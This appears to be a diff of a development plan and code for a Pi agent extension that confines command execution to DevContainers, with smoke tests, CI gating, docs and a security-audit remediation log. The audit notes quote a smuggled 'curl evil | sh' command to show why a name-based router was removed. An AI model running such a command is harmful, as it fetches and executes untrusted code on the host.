  * 1 = a required step failed.
  *
  * Usage:
  *   node scripts/smoke-pi-package.mjs            # full: pack + install + model turn
- *   node scripts/smoke-pi-package.mjs --no-model # manifest/install checks only
+ *   node scripts/smoke-pi-package.mjs --no-model # manifest/packed-artifact checks only
  */
-import { execFileSync, execSync, spawnSync } from "node:child_process";
+import { execFileSync, spawnSync } from "node:child_process";
 import { existsSync, mkdtempSync, readFileSync, rmSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { resolve, dirname, join } from "node:path";
@@ -8301,9 +9019,6 @@ function providerConfigured() {
 const pi = piOnPath();
 if (pi === undefined) {
   if (noModel) {
-    // CI runs this in --no-model mode without a global pi install; the
-    // manifest + packed-tarball contract checks below still run and the
-    // model-touching install/probe steps are skipped by named reason.
     console.warn("[smoke-pi-package] pi CLI not on PATH; skipping install/probe steps (--no-model).");
   } else {
     fail("pi CLI not found on PATH; run: npm i -g @earendil-works/pi-coding-agent");
@@ -8317,7 +9032,10 @@ const manifest = JSON.parse(readFileSync(join(root, "package.json"), "utf8"));
 log(manifest.pi?.extensions?.length === 1, `pi.extensions manifest present (${manifest.pi?.extensions?.[0] ?? "missing"})`);
 
 const tmp = mkdtempSync(join(tmpdir(), "pi-dcm-smoke-"));
+const extractDir = mkdtempSync(join(tmpdir(), "pi-dcm-extract-"));
+const installDir = mkdtempSync(join(tmpdir(), "pi-dcm-store-"));
 let tarball;
+let packedDist;
 try {
   // Real pack (not --dry-run) so `pi install` can consume it.
   const out = execFileSync("npm", ["pack", "--pack-destination", tmp], { cwd: root, encoding: "utf8", timeout: 120_000 });
@@ -8327,17 +9045,30 @@ try {
   fail(`npm pack failed: ${error instanceof Error ? error.message : String(error)}`);
 }
 
+// 1b. Extract the SAME tarball so every later assertion inspects the PACKED
+// artifact rather than the checkout's (possibly stale) dist/ directory.
+if (tarball !== undefined) {
+  try {
+    execFileSync("tar", ["-xzf", tarball, "-C", extractDir], { encoding: "utf8", timeout: 120_000 });
+    packedDist = join(extractDir, "package", "dist", "extensions", "index.js");
+    log(existsSync(packedDist), `packed tarball contains dist/extensions/index.js`);
+  } catch (error) {
+    fail(`extracting packed tarball failed: ${error instanceof Error ? error.message : String(error)}`);
+  }
+}
+
 // 2. Install into a throwaway Pi package store (local path install).
-const installDir = mkdtempSync(join(tmpdir(), "pi-dcm-store-"));
 if (tarball !== undefined && pi !== undefined) {
   try {
-    // `pi install <tarball>` adds it to the user's settings — to keep this
-    // hermetic we install with --local-flag-equivalent by pointing settings
-    // via PI_CODING_AGENT_DIR to a scratch dir so nothing user-global changes.
-    const prevDir = process.env.PI_CODING_AGENT_DIR;
-    process.env.PI_CODING_AGENT_DIR = installDir;
-    execFileSync(pi, ["install", tarball, "--approve"], { cwd: root, encoding: "utf8", timeout: 120_000, stdio: ["ignore", "inherit", "inherit"] });
-    process.env.PI_CODING_AGENT_DIR = prevDir;
+    // Keep this hermetic: point PI_CODING_AGENT_DIR at a scratch dir so nothing
+    // user-global changes.
+    execFileSync(pi, ["install", tarball, "--approve"], {
+      cwd: root,
+      encoding: "utf8",
+      timeout: 120_000,
+      stdio: ["ignore", "inherit", "inherit"],
+      env: { ...process.env, PI_CODING_AGENT_DIR: installDir },
+    });
     log(true, `pi install ${tarball} succeeded into scratch store`);
   } catch (error) {
     log(false, `pi install failed: ${error instanceof Error ? error.message : String(error)}`);
@@ -8346,9 +9077,24 @@ if (tarball !== undefined && pi !== undefined) {
   console.warn("[smoke-pi-package] pi CLI not on PATH; skipping hermetic install step.");
 }
 
-// 3. Model-gated registration probe.
+// 3. Packed-artifact surface probe (no model needed): assert the PACKED dist
+//    registers the tools, the same-name bash override, the /devcontainer
+//    command, and the user_bash route.
+if (packedDist !== undefined && existsSync(packedDist)) {
+  const src = readFileSync(packedDist, "utf8");
+  log(src.includes("registerCommand") || src.includes("devcontainer"), "packed dist registers the /devcontainer command surface");
+  log(src.includes("user_bash"), "packed dist registers the user_bash route");
+  log(
+    src.includes("createBashToolDefinition") || src.includes("registerTool"),
+    "packed dist registers tools incl. same-name bash override",
+  );
+} else if (tarball !== undefined) {
+  fail("packed tarball is missing dist/extensions/index.js");
+}
+
+// 4. Model-gated registration probe against the INSTALLED packed extension.
 const modelConfigured = providerConfigured();
-if (!noModel && modelConfigured && tarball !== undefined) {
+if (!noModel && modelConfigured && tarball !== undefined && pi !== undefined) {
   try {
     const argv = [
       "-p", "--no-session", "--offline",
@@ -8358,10 +9104,16 @@ if (!noModel && modelConfigured && tarball !== undefined) {
       "--tools", "devcontainer_status,devcontainer_exec,devcontainer_host_exec",
       "Reply with exactly the tool names you can call, one per line.",
     ];
-    const result = spawnSync(pi, argv, { encoding: "utf8", timeout: 180_000 });
+    // PI_CODING_AGENT_DIR MUST point at the scratch store so the model turn
+    // loads the packed extension (not a user-global install).
+    const result = spawnSync(pi, argv, {
+      encoding: "utf8",
+      timeout: 180_000,
+      env: { ...process.env, PI_CODING_AGENT_DIR: installDir },
+    });
     const out = `${result.stdout}\n${result.stderr}`;
     const ok = result.status !== null && !out.includes("Extension error") && !out.includes("Unknown tool");
-    log(ok, "real Pi runtime loaded the extension (tools resolvable, no extension error)");
+    log(ok, "real Pi runtime loaded the PACKED extension (tools resolvable, no extension error)");
     if (!ok) {
       console.error(out.slice(0, 2000));
     }
@@ -8372,20 +9124,8 @@ if (!noModel && modelConfigured && tarball !== undefined) {
   console.warn("[smoke-pi-package] provider not configured (PI_PROVIDER/PI_MODEL unset); skipping model-touching probe.");
 }
 
-// 4. Slash command + user_bash registration are structural (no model needed):
-//    the extension entrypoint registers them at load; presence in the packed
-//    dist is the assertion, since a real command turn also needs a model.
-const distEntry = join(root, "dist", "extensions", "index.js");
-if (existsSync(distEntry)) {
-  const src = readFileSync(distEntry, "utf8");
-  log(src.includes("registerCommand") || src.includes("devcontainer"), "packed dist registers the /devcontainer command surface");
-  log(src.includes("user_bash"), "packed dist registers the user_bash route");
-  log(src.includes("createBashToolDefinition") || src.includes("registerTool"), "packed dist registers tools incl. same-name bash override");
-} else {
-  console.warn("[smoke-pi-package] dist not built (run `npm run build` first); skipping dist source probe.");
-}
-
 rmSync(tmp, { recursive: true, force: true });
+rmSync(extractDir, { recursive: true, force: true });
 rmSync(installDir, { recursive: true, force: true });
 
 if (failures.length > 0) {
@@ -8609,11 +9349,14 @@ jobs:
 
   publish:
     name: publish to npm
-    needs: [verify]
+    # The packed-tarball runtime smoke gates publishing whenever provider
+    # secrets are configured. When that job is SKIPPED (no PI_PROVIDER secret)
+    # publishing still proceeds, so secret-less dry runs are not blocked.
+    needs: [verify, smoke-pi]
     runs-on: ubuntu-latest
     # github.event.inputs.* arrives as the STRING "true"/"false"; compare
     # explicitly so a real (non-dry-run) dispatch actually publishes.
-    if: ${{ github.event.inputs.dry_run == 'false' }}
+    if: ${{ github.event.inputs.dry_run == 'false' && (needs.smoke-pi.result == 'success' || needs.smoke-pi.result == 'skipped') }}
     steps:
       - uses: actions/checkout@v4
         with:
@@ -8719,18 +9462,26 @@ or persisted.
 - **Executes** through a shared, governed service — the `devcontainer_exec` tool,
   routed Pi `bash`, and `!`/`!!` all hit the same target validation, policy,
   environment filtering, audit, output accounting, cancellation, and timeout.
-- **Guides the agent's routing.** Each execution tool carries system-prompt
-  guidance stating where it runs (`bash`/`devcontainer_exec` = inside the
-  selected container, `devcontainer_host_exec` = host-only administration,
-  file tools = host), so container-environment work is not run on the host
-  and host administration is not routed into the container.
+- **Guides the agent's routing with facts, not guesses.** Before each turn the
+  extension appends the current target, the `workspaceFolder`/`workspaceMount`
+  host↔container mapping, and the execution-surface rules to the system prompt,
+  so the agent can tell which environment a path or task belongs to. `bash`,
+  `!`/`!!`, and `devcontainer_exec` are always the container;
+  `devcontainer_host_exec` is the explicit, policy-gated host surface; file
+  tools are host. The extension deliberately does **not** classify shell text
+  (shell operators defeat any name/prefix rule) — the choice is explicit.
+  It also refuses host execution of an argv that targets a container-only path,
+  and blocks the built-in `powershell` tool while a container is selected.
 - **Keeps file tools on the host.** `read`/`write`/`edit`/`grep`/`find`/`ls`
   always operate on the host filesystem — never routed into the container.
   A DevContainer's workspace is a bind mount, so host and container paths
   are the same files; only execution is environment-sensitive (toolchain,
   interpreter, dependencies, container-only mounts).
 - **Manages** lifecycle: `up`, `build`, `stop`, `remove` (stop/remove need a
-  policy grant **plus** a fresh per-action confirmation), and bounded `logs`.
+  policy grant **plus** a fresh per-action confirmation), and bounded `logs`
+  (now policy-checked and audited like every other operation). A successful
+  `up` re-resolves the selection, so a config-only target becomes usable
+  without a second `/devcontainer use`.
 - **Audits** every operation to a host-local JSONL file (fingerprint capture by
   default, 90-day retention).
 - **Never falls back silently** to the host: a `container-required` route returns
@@ -9017,15 +9768,17 @@ untrusted/less-privileged project config can never *expand* a global grant:
 | `discovery.excludedDirectories` | `project ∩ global` |
 | `audit.retentionDays` | `min(project, global)` |
 | `audit.commandCapture` | lower of the two in `none < fingerprint-only < redacted-text` |
-| `audit.enabled` | project `false` wins; else global `false`; else default `true` (merge only — not yet gating in v1) |
+| `audit.enabled` | project `false` wins; else global `false`; else default `true`. When `false` the runtime accepts records but persists nothing. |
 | `destructive.allowStop/allowRemove` | `true` only when **both** global and project grant it |
 | `hostExecution.allow` | `true` only when **both** grant it |
 
 `audit.directory` is merged global-only into the effective config (a project
-config cannot relocate the audit directory). The v1 runtime always writes to
-the platform default (see below); `directory` is carried for future override.
-`dockerPath`/`devcontainerPath`/`routeMode` prefer project over global
-when both set (these do not raise privilege, so project wins).
+config cannot relocate the audit directory) and **is honored** by the runtime;
+when unset, the platform default is used. `audit.enabled: false` accepts
+records but persists nothing.
+`dockerPath`/`devcontainerPath`/`routeMode` prefer project over global when
+both set (these do not raise privilege, so project wins). In v1 `routeMode`
+must be `"container-required"`; the other values are rejected at load.
 
 ## Reference
 
@@ -9055,11 +9808,12 @@ when both set (these do not raise privilege, so project wins).
 | Mode | Behavior |
 |---|---|
 | `container-required` | Execution requires a running selected target. With no explicit selection, the session-cwd workspace is auto-selected as the default when it has a DevContainer configuration; if still no target resolves (no config, ambiguous, stale/stopped, denied) the route returns `no-candidate` / `ambiguous-candidate` / `target-stopped` / `policy-denied`. **Never** executes on the host. |
-| `container-preferred` | Container when possible; reserved for future host fallback semantics. |
-| `host-only` | Reserved for future host-only operation. |
+| `container-preferred` | **Not implemented** — setting it is rejected at load so a mode that silently does nothing cannot be configured. |
+| `host-only` | **Not implemented** — rejected at load. |
 
-In v1 the implemented, tested, and default mode is `container-required`. The
-only host execution surface is the explicit, policy-gated, audited
+In v1 the implemented, tested, and default mode is `container-required`; the
+other two values are accepted by the type but rejected by validation. The only
+host execution surface is the explicit, policy-gated, audited
 `devcontainer_host_exec` tool and `/devcontainer host-exec` command
 (`hostExecution.allow`).
 
@@ -9114,9 +9868,10 @@ tools; use `devcontainer_exec` (container-side `cat`/`find`) to reach them.
 ### `maxOutputBytes`
 
 - Type: `number` · Default: `51200` (`50 * 1024`)
-- Positive finite number. Output captured per operation is bounded; overflow
-  sets the `truncated` flag while child streams keep draining (no pipe
-  deadlock).
+- Positive finite number. Each output stream (stdout and stderr) is bounded
+  independently, so a command that floods stderr cannot exhaust the extension
+  process; overflow sets the `truncated` flag while the streams keep draining
+  (no pipe deadlock). Captured memory is therefore at most 2× this value.
 
 ### `discovery`
 
@@ -9244,6 +9999,30 @@ execution service, which:
 5. writes one audit record and returns a structured result with **no
    environment values**.
 
+## Routing guards
+
+The extension does **not** classify shell text to decide the environment —
+shell operators, substitutions, and compound commands defeat any name/prefix
+rule (a former command-router experiment was removed for exactly this reason).
+Instead:
+
+- `bash`, `!`/`!!`, and `devcontainer_exec` are **always** the container;
+  `devcontainer_host_exec` and `/devcontainer host-exec` are the only host
+  surfaces, both policy-gated (`hostExecution.allow`) and audited.
+- Before each turn the agent receives the current target, the workspace's
+  host↔container mapping, and the surface rules, so it chooses explicitly.
+- `devcontainer_host_exec` **refuses** an argv that targets a container-only
+  path (a reliable check: literal argv carries no shell syntax).
+- While a target is selected, the built-in `powershell` tool — which Pi would
+  otherwise spawn on the host — is **blocked** through the `tool_call` hook
+  with a message pointing at the routed surfaces. (`tool_call` can block or
+  rewrite input; it cannot re-route, so no redirection is attempted.)
+- Workspace containment compares `realpath`, so a symlink beneath an allowed
+  root that points outside it is denied.
+- Container execution requires the request workspace to be the bound target
+  workspace (or a path below it), and the CLI always receives the bound target
+  workspace, so authorization scope, container id, and audit cannot disagree.
+
 ## File access model
 
 File access and command execution have different trust surfaces, and this
@@ -9288,17 +10067,20 @@ extension keeps them separate:
 
 ## Audit
 
-Every operation writes a host-local JSONL record. The effective config carries
-an `audit.enabled` flag (default **true**); the v1 runtime writes records
-unconditionally and the default retention is **90 days** with
-**`fingerprint-only` command capture**.
+Every operation writes a host-local JSONL record. `audit.enabled` (default
+**true**) is honored: when `false`, records are accepted but nothing is
+persisted. `audit.directory` (global-only) is honored when set; otherwise the
+platform default below is used. Default retention is **90 days** with
+**`fingerprint-only` command capture**. Denied attempts are audited too (a
+policy probe is visible, not silent), and adapter failures for
+`up`/`build`/`lifecycle`/`logs` record an `errorSummary` instead of vanishing.
+`/devcontainer logs` is now policy-checked and audited like every other
+operation.
 
 - Audit directory (mode `0700`, files `0600`):
   - Linux: `$XDG_STATE_HOME/pi-devcontainer-manager/audit`
     (default `~/.local/state/pi-devcontainer-manager/audit`)
   - macOS: `~/Library/Application Support/pi-devcontainer-manager/audit`
-- `audit.directory` is **global-only** in the effective config; the v1 runtime
-  writes to the platform default above (the override is not yet consumed).
 - Command identity is a SHA-256 **fingerprint** over argv by default, never
   plaintext. `redacted-text` mode stores the joined command with secret-looking
   patterns redacted (`key=[REDACTED]`); `none` stores no command identity.
@@ -9315,7 +10097,12 @@ unconditionally and the default retention is **90 days** with
 
 - All host and container processes are spawned with `shell: false`, a fixed
   executable, an argv array, a sanitized environment, cancellation, timeout, and
-  bounded stream accounting.
+- **Both** stdout and stderr are bounded by `maxOutputBytes` (each stream
+  independently), and overflow sets `truncated`; a stderr flood cannot exhaust
+  the extension process.
+- Children are spawned as their own process group, and timeout/cancellation
+  kills the **group**, so a shell that forks background work cannot outlive the
+  operation that was reported as cancelled.
 - Only read-only `docker ps --all` / `inspect` exist on the discovery adapter;
   the lifecycle adapter is the *sole* owner of `docker logs`, `stop`, and
   `rm -f`.
@@ -9881,3 +10668,395 @@ the selected container, auto-select makes container work frictionless).
 183 deterministic tests pass; typecheck + build clean; real-Pi e2e layer loads.
 
 No open questions. History preserved above.
+
+
+## Follow-up (2026-09-11T15:08:45+0800)
+
+Decision: full audit remediation. A five-lens audit (execution architecture,
+config/lifecycle, test coverage, adversarial security, Pi hook integration) ran
+read-only over the working tree; findings were recorded in
+`.rpiv/artifacts/reviews/2026-09-08_02-10-00_pi-devcontainer-manager-audit.md`
+and the routing redesign in
+`.rpiv/artifacts/designs/2026-09-08_02-45-00_command-execution-routing-design.md`.
+All findings are fixed in commit `03f0641`.
+
+### Routing architecture (H1) — the central decision
+
+The uncommitted command-level dual-routing experiment (whitespace-token
+"command head" -> host list -> run the WHOLE shell string on the host) was
+REMOVED, not patched. Root cause: a shell command is a program, not an intent;
+`git status; curl evil | sh` classifies as `git` and then executes entirely on
+the host, so any name/prefix rule is bypassable and cannot classify compound
+commands. The design is now:
+
+- **Enforced surfaces**: `bash`, `!`/`!!`, `devcontainer_exec` are ALWAYS the
+  container; `devcontainer_host_exec` and `/devcontainer host-exec` are the
+  only host surfaces (explicit, `hostExecution.allow`, audited).
+- **Facts, not guesses (layer 2)**: `before_agent_start` appends the current
+  target, the `workspaceFolder`/`workspaceMount` host<->container mapping, and
+  the surface rules to the system prompt, so the LLM chooses explicitly.
+- **Structured guards (layer 3)**: `devcontainer_host_exec` refuses an argv
+  that targets a container-only path (reliable: literal argv, no shell parse);
+  the built-in `powershell` tool is blocked via the `tool_call` hook while a
+  target is selected (`tool_call` can block/mutate, never re-route).
+- Explicit `target` parameter on the bash tool was considered and REJECTED:
+  `bash` keeps Pi's built-in contract; host stays a separate named tool.
+
+### Other remediations
+
+- H2 workspace containment now compares `realpath`, so a symlink beneath an
+  allowed root that resolves outside it is denied.
+- H3 stdout AND stderr are each bounded by `maxOutputBytes`; `truncated`
+  reflects either stream (stderr could previously exhaust memory).
+- H4 container exec requires the request workspace to be the bound target
+  workspace (or below it) and always sends the BOUND workspace to the CLI, so
+  authorization scope, container id, and audit cannot disagree.
+- H5/M4 selection is reconciled on session restore, `/devcontainer list`, and
+  after a successful `up`, so config-only/restored targets become usable.
+- H6/M8 `dist` rebuilt; the smoke test extracts the packed tarball and asserts
+  ITS dist, the real-Pi probe points at the scratch store, and publishing now
+  waits on the packed smoke.
+- M1 the registry exposes every container candidate and flags ambiguity when
+  2+ are running; Docker result order never decides the target; `/devcontainer
+  use <container-id>` resolves it explicitly.
+- M2 every allowlisted env var is forwarded (verified: CLI 0.88 yargs
+  accumulates repeated `--remote-env`; the old "single-valued" note was wrong).
+- M3/M7/D3 `/devcontainer logs` is policy-checked and audited; denied attempts
+  and adapter failures for `up`/`build`/`lifecycle` write audit records.
+- M5 host execution is capped by `maxTimeoutSeconds` (default when omitted).
+- M6 nested config shapes are validated with named errors.
+- M9 credential redaction covers auth schemes, `--secret-flag value`, `key=value`,
+  and URL userinfo.
+- L2 JSONC-tolerant devcontainer parsing; L3 `audit.enabled`/`audit.directory`
+  are honored; D1 children spawn as their own process group and timeout/cancel
+  kills the group; D2 unimplemented `routeMode` values are rejected at load.
+
+### New files
+
+**File**: `src/execution-context.ts`
+**Changes**: Pi-free renderer for the per-turn execution-context block
+(target + host<->container mapping + container-only mounts + surface rules).
+
+```ts
+/**
+ * Renders the DevContainer execution-context block injected into the agent's
+ * system prompt before each turn (`before_agent_start`).
+ *
+ * Design intent (see `.rpiv/artifacts/designs/`): the extension does NOT guess
+ * which command belongs in the container vs the host from command text — that
+ * is unreliable (shell operators defeat any name/head-based classifier). Instead
+ * the LLM decides, using two explicit, enforced surfaces, and this module gives
+ * it the FACTS it needs to decide correctly:
+ *
+ *   - `bash`, `!`, `!!`, `devcontainer_exec`  -> always the container
+ *   - `devcontainer_host_exec`                -> the host (explicit, policy-gated)
+ *   - the workspace mapping (host path <-> container path) and container-only
+ *     mounts, so the LLM can tell which environment a path belongs to.
+ *
+ * This module is Pi-free and pure so it is unit-testable without the Pi
+ * dependency; `extensions/index.ts` renders it and appends it to the system
+ * prompt.
+ */
+import type { PathMapping } from "./path-mapper.js";
+
+export interface ExecutionContextFacts {
+  /** Selected target's candidate id (container id), when known. */
+  readonly candidateId?: string;
+  /** Selected target's display name, when known. */
+  readonly candidateName?: string;
+  /** Selection status (e.g. "selected-valid", "selected-stopped"). */
+  readonly status?: string;
+  /** Host <-> container workspace mapping derived from devcontainer.json. */
+  readonly mapping?: PathMapping;
+  /**
+   * Container-only locations (extra mounts / volumes) that host file tools and
+   * host commands cannot see. Rendered path-style; empty/absent when none.
+   */
+  readonly containerOnlyMounts?: readonly string[];
+}
+
+/**
+ * Render the injection block, or `undefined` when there is nothing useful to
+ * say (no selected target and no mapping). Never fabricates facts.
+ */
+export function renderExecutionContext(facts: ExecutionContextFacts): string | undefined {
+  const hasTarget = facts.candidateId !== undefined || (facts.status !== undefined && facts.status !== "none");
+  if (!hasTarget && facts.mapping === undefined) return undefined;
+  const lines: string[] = ["## DevContainer execution context", ""];
+
+  if (facts.candidateId !== undefined || facts.status !== undefined) {
+    const identity = [
+      facts.candidateName ?? "target",
+      facts.candidateId !== undefined ? `(${facts.candidateId.slice(0, 12)})` : undefined,
+    ]
+      .filter((part): part is string => part !== undefined)
+      .join(" ");
+    lines.push(`Target: ${identity}${facts.status !== undefined ? ` — ${facts.status}` : ""}`);
+  }
+  if (facts.mapping !== undefined) {
+    lines.push(
+      `Workspace mapping: host \`${facts.mapping.hostPath}\` ↔ container \`${facts.mapping.containerPath}\` (bind mount)`,
+    );
+  }
+  if (facts.containerOnlyMounts !== undefined && facts.containerOnlyMounts.length > 0) {
+    lines.push(`Container-only mounts (not visible to host tools): ${facts.containerOnlyMounts.join(", ")}`);
+  }
+
+  lines.push("");
+  lines.push("Execution surfaces (choose by WHAT the command operates on, not by its name):");
+  lines.push("- `bash`, `!`, `!!`, `devcontainer_exec` → run INSIDE the container (default).");
+  lines.push("- `devcontainer_host_exec` → runs on the HOST (explicit; requires hostExecution.allow).");
+  lines.push("");
+  lines.push("Decision rules:");
+  lines.push("- Result depends on the container toolchain, or on a container-only path → container surfaces.");
+  lines.push(
+    "- Manages the host itself (docker daemon, host services/daemons) or a host path outside the mount → `devcontainer_host_exec`.",
+  );
+  lines.push(
+    "- Host-side file inspection/editing → the host file tools (read/write/edit); they see the same files via the bind mount.",
+  );
+
+  return lines.join("\n");
+}
+```
+
+**File**: `vitest.config.ts`
+**Changes**: raises the per-test/hook timeout so real-DevContainer integration
+and e2e runs are not flaky (a single `up` exceeds vitest's 5s default).
+
+```ts
+import { defineConfig } from "vitest/config";
+
+export default defineConfig({
+  test: {
+    // The integration/e2e suites start REAL DevContainers through the pinned
+    // CLI; a single container `up` routinely exceeds the 5s default per-test
+    // budget, which made those suites flaky. Unit tests are unaffected in
+    // practice (they finish in milliseconds).
+    testTimeout: 120_000,
+    hookTimeout: 120_000,
+  },
+});
+```
+
+**File**: `tests/unit/execution-context.test.ts`
+**Changes**: rendering cases (no target, mapping only, container-only mounts,
+id truncation, status).
+
+```ts
+/**
+ * Unit tests for the execution-context block injected into the system prompt.
+ *
+ * The block is how the agent learns the FACTS (host<->container mapping, which
+ * surfaces exist) so it can choose the right environment itself. It is
+ * presentation only — it must never fabricate a mapping or a target.
+ */
+import { describe, expect, it } from "vitest";
+import { renderExecutionContext } from "../../src/execution-context.js";
+
+describe("renderExecutionContext", () => {
+  it("returns undefined when there is no target and no mapping", () => {
+    expect(renderExecutionContext({})).toBeUndefined();
+  });
+
+  it("returns undefined for an unselected target with no mapping", () => {
+    expect(renderExecutionContext({ status: "none" })).toBeUndefined();
+  });
+
+  it("renders the host<->container mapping and the surface guidance", () => {
+    const block = renderExecutionContext({
+      candidateId: "abcdef0123456789",
+      status: "selected-valid",
+      mapping: { hostPath: "/data/work/proj", containerPath: "/app" },
+    });
+    expect(block).toBeDefined();
+    expect(block).toContain("/data/work/proj");
+    expect(block).toContain("/app");
+    expect(block).toContain("devcontainer_host_exec");
+    expect(block).toContain("devcontainer_exec");
+    expect(block).toContain("INSIDE the container");
+  });
+
+  it("truncates the candidate id and includes the selection status", () => {
+    const block = renderExecutionContext({ candidateId: "0123456789abcdef", status: "selected-valid" });
+    expect(block).toContain("(0123456789ab)");
+    expect(block).toContain("selected-valid");
+  });
+
+  it("lists container-only mounts when present", () => {
+    const block = renderExecutionContext({
+      candidateId: "c1",
+      containerOnlyMounts: ["/app/.models", "cache-volume"],
+    });
+    expect(block).toContain("Container-only mounts");
+    expect(block).toContain("/app/.models");
+    expect(block).toContain("cache-volume");
+  });
+
+  it("omits the mounting line when no mapping is known", () => {
+    const block = renderExecutionContext({ candidateId: "c1", status: "selected-stopped" });
+    expect(block).toBeDefined();
+    expect(block).not.toContain("Workspace mapping");
+  });
+
+  it("renders from a mapping even before a target is selected", () => {
+    const block = renderExecutionContext({ mapping: { hostPath: "/h", containerPath: "/c" } });
+    expect(block).toContain("/h");
+    expect(block).toContain("/c");
+  });
+});
+```
+
+**File**: `tests/unit/policy-hardening.test.ts`
+**Changes**: realpath symlink-escape denial + credential-redaction coverage.
+
+```ts
+/**
+ * Hardening tests for workspace authorization and audit redaction.
+ *
+ * - `isWorkspaceAllowed` must compare filesystem IDENTITY (realpath), not just
+ *   lexical containment: a symlink beneath an allowed root that points outside
+ *   it must be denied (audit finding H2).
+ * - `redactText` is best-effort but must cover the common credential forms that
+ *   previously survived (Authorization headers, --flag values, URL userinfo).
+ */
+import { mkdirSync, mkdtempSync, rmSync, symlinkSync } from "node:fs";
+import { tmpdir } from "node:os";
+import { join } from "node:path";
+import { describe, expect, it } from "vitest";
+import { isWorkspaceAllowed, redactText } from "../../src/policy.js";
+
+describe("isWorkspaceAllowed (filesystem identity)", () => {
+  it("denies a symlink beneath an allowed root that resolves outside it", () => {
+    const base = mkdtempSync(join(tmpdir(), "pi-dcm-policy-"));
+    try {
+      const allowed = join(base, "allowed");
+      const outside = join(base, "outside");
+      mkdirSync(allowed);
+      mkdirSync(outside);
+      const link = join(allowed, "link");
+      symlinkSync(outside, link, "dir");
+
+      const roots = [allowed];
+      // Lexically below the root, physically outside it.
+      expect(isWorkspaceAllowed(link, roots)).toBe(false);
+      // A real child of the root (even one that does not exist yet) is allowed.
+      expect(isWorkspaceAllowed(join(allowed, "sub"), roots)).toBe(true);
+      // The root itself is allowed.
+      expect(isWorkspaceAllowed(allowed, roots)).toBe(true);
+    } finally {
+      rmSync(base, { recursive: true, force: true });
+    }
+  });
+
+  it("still rejects paths outside every root and non-absolute paths", () => {
+    expect(isWorkspaceAllowed("/nope/x", ["/repo"])).toBe(false);
+    expect(isWorkspaceAllowed("relative/path", ["/repo"])).toBe(false);
+    expect(isWorkspaceAllowed("/repo/x", [])).toBe(false);
+  });
+});
+
+describe("redactText", () => {
+  it("redacts Authorization bearer/basic values entirely", () => {
+    const out = redactText("curl -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.abc' https://x");
+    expect(out).not.toContain("eyJhbGciOiJIUzI1NiJ9.abc");
+    expect(out).toContain("[REDACTED]");
+  });
+
+  it("redacts key=value and key: value secret assignments", () => {
+    expect(redactText("API_TOKEN=abc123")).not.toContain("abc123");
+    expect(redactText("password: hunter2")).not.toContain("hunter2");
+  });
+
+  it("redacts secret-bearing long flags", () => {
+    expect(redactText("deploy --password s3cr3t --token=xyz")).not.toContain("s3cr3t");
+    expect(redactText("deploy --password s3cr3t --token=xyz")).not.toContain("xyz");
+  });
+
+  it("redacts credentials embedded in URLs", () => {
+    const out = redactText("git clone https://user:ghp_secret@github.com/org/repo.git");
+    expect(out).not.toContain("ghp_secret");
+    expect(out).toContain("[REDACTED]@github.com");
+  });
+
+  it("leaves ordinary command text intact", () => {
+    expect(redactText("npm test -- --watch")).toBe("npm test -- --watch");
+  });
+});
+```
+
+**File**: `tests/unit/container-path-guard.test.ts`
+**Changes**: `findContainerPath` guard cases and the mapping that feeds it.
+
+```ts
+/**
+ * Tests for the structured container-path guard used on the explicit HOST
+ * surface (audit finding H1/M10 companion).
+ *
+ * The guard runs on literal argv (no shell parsing), so it is a RELIABLE check:
+ * it catches an argv that targets a path which exists only inside the container,
+ * where host execution would silently do the wrong thing.
+ */
+import { describe, expect, it } from "vitest";
+import { findContainerPath, hostToContainer, parseWorkspaceMount, buildPathMapping } from "../../src/path-mapper.js";
+
+describe("findContainerPath", () => {
+  it("flags the container path itself and paths beneath it", () => {
+    expect(findContainerPath(["ls", "-la", "/app"], "/app")).toBe("/app");
+    expect(findContainerPath(["cat", "/app/src/index.ts"], "/app")).toBe("/app/src/index.ts");
+    expect(findContainerPath(["/app/.models/weights.bin"], "/app")).toBe("/app/.models/weights.bin");
+  });
+
+  it("ignores host paths and non-path tokens", () => {
+    expect(findContainerPath(["git", "status"], "/app")).toBeUndefined();
+    expect(findContainerPath(["cat", "/etc/hosts"], "/app")).toBeUndefined();
+    expect(findContainerPath(["echo", "app"], "/app")).toBeUndefined();
+    expect(findContainerPath(["cat", "/application/x"], "/app")).toBeUndefined();
+  });
+
+  it("normalizes trailing slashes on the container path", () => {
+    expect(findContainerPath(["ls", "/app/x"], "/app/")).toBe("/app/x");
+  });
+
+  it("returns undefined for an empty container path", () => {
+    expect(findContainerPath(["ls", "/app"], "")).toBeUndefined();
+  });
+});
+
+describe("path mapping feeds the guard", () => {
+  it("derives the container path from workspaceMount", () => {
+    const mapping = buildPathMapping(
+      "/data/work/proj",
+      "/app",
+      "source=${localWorkspaceFolder},target=/app,type=bind",
+    );
+    expect(mapping).toEqual({ hostPath: "/data/work/proj", containerPath: "/app" });
+    expect(findContainerPath(["npm", "test", "--prefix", "/app"], mapping!.containerPath)).toBe("/app");
+  });
+
+  it("parses a mount string defensively", () => {
+    expect(parseWorkspaceMount("source=/h,target=/c,type=bind")).toEqual({ source: "/h", target: "/c", type: "bind" });
+    expect(parseWorkspaceMount(undefined)).toEqual({});
+  });
+
+  it("maps a host path into the container tree", () => {
+    const mapping = { hostPath: "/host/proj", containerPath: "/app" };
+    expect(hostToContainer("/host/proj/src/a.ts", mapping)).toBe("/app/src/a.ts");
+    expect(hostToContainer("/elsewhere/a.ts", mapping)).toBeUndefined();
+  });
+});
+```
+
+### Verification
+
+- `tsc --noEmit` clean; `npm run build` clean; `verify-package` gates pass.
+- 215 unit tests (20 files; +30 this change), 11 integration/package tests, and
+  5 e2e tests (real Pi load + real Docker + pinned CLI) pass.
+- Packed smoke passes against the extracted tarball.
+- Every `**File**:` fence in this plan is re-synced byte-for-byte; the 22 drifted
+  fences (including README/docs drift predating this change) are now current.
+- The temporary global config used only to enable `hostExecution.allow` for
+  validation was removed; host execution is back to its default (denied).
+
+No open questions.
+
